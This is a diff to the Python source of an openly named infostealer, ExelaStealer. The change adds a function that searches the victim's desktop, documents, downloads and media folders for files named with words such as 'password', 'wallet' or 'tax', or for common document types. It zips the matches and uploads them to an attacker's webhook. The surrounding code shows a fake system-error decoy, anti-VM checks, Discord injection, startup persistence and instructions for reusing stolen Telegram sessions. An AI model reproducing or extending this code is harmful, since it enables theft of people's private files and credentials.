@@ -15,7 +15,7 @@ webhook = '%WEBHOOK%'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
-FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0)) 
+FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
 
 def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
@@ -564,6 +564,38 @@ class Main:
                     with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                         write_file.write("https://t.me/ExelaStealer\n=======================================\n")
                         write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
+        except:
+            pass
+    async def StealCommonFiles(self, toPath:str) -> None:
+        try:
+            full_path = os.path.join(self.Temp, toPath)
+            if os.path.isdir(full_path):
+                try:
+                    shutil.rmtree(full_path)
+                except:
+                    pass
+            os.mkdir(full_path)
+            dirs = {
+                "Desktop": f'{os.path.join(os.getenv("userprofile"), "Desktop")}',
+                "Desktop2": f'{os.path.join(os.getenv("userprofile"),"OneDrive", "Desktop")}',
+                "Pictures": f'{os.path.join(os.getenv("userprofile"), "Pictures")}',
+                "Documents": f'{os.path.join(os.getenv("userprofile"), "Documents")}',
+                "Music": f'{os.path.join(os.getenv("userprofile"), "Music")}',
+                "Videos": os.path.join(os.getenv("userprofile"), "Videos"),
+                "Downloads": f'{os.path.join(os.getenv("userprofile"), "Downloads")}'}
+            extantions = (".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx")
+            names = ("secret", "password", "account", "tax", "key", "wallet", "backup")
+            for name, paths in dirs.items():
+                if os.path.exists(paths):
+                    # list all files, dirs,subfolders etc...
+                    for root, folders, files in os.walk(paths):
+                        for file in files:
+                            file_path = os.path.join(root, file)
+                            if (any([x in file_path.lower() for x in names]) or file_path.endswith(extantions) and os.path.getsize(file_path) < 2 * 1024 * 1024):
+                                os.makedirs(os.path.join(full_path, name), exist_ok=True)
+                                try:
+                                    shutil.copy(file_path, os.path.join(full_path, name, file))
+                                except:continue   
         except:
             pass
     async def RiotGamesSession(self, cookie, browser:str) -> None:
@@ -1893,11 +1925,23 @@ class Main:
             payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
             async with session.post(webhook, data=payload) as f:
                 pass
+            del payload
             try:
                 os.remove(filePath + ".zip")
                 shutil.rmtree(filePath)
             except:
                 pass
+            await self.StealCommonFiles("CommonFiles")
+            try:
+                shutil.make_archive(os.path.join(self.Temp, "CommonFiles"), "zip", os.path.join(self.Temp, "CommonFiles"))
+                with open(os.path.join(self.Temp, "CommonFiles") + ".zip", 'rb') as file:
+                    dosya_verisi = file.read()
+                payload = aiohttp.FormData()
+                payload.add_field('file', dosya_verisi, filename=os.path.basename(os.path.join(self.Temp, "CommonFiles") + ".zip"))
+                async with session.post(webhook, data=payload) as f:
+                    pass
+            except Exception as e:
+                print(e)
 class Startup:
     def __init__(self) -> None:
         self.LocalAppData = os.getenv("LOCALAPPDATA")
